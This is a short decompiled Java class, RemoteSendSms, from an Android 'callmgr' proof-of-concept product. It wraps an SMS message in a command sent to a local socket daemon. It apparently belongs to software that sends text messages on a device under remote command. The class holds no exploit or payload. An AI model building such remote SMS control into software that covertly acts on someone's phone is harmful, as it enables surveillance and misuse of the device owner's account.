package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.SmsMessage;

public class RemoteSendSms
  extends SocketCmd
{
  private static final long serialVersionUID = -4672408481848947239L;
  
  public RemoteSendSms(SmsMessage paramSmsMessage)
  {
    super(paramSmsMessage, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteSendSms";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteSendSms.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */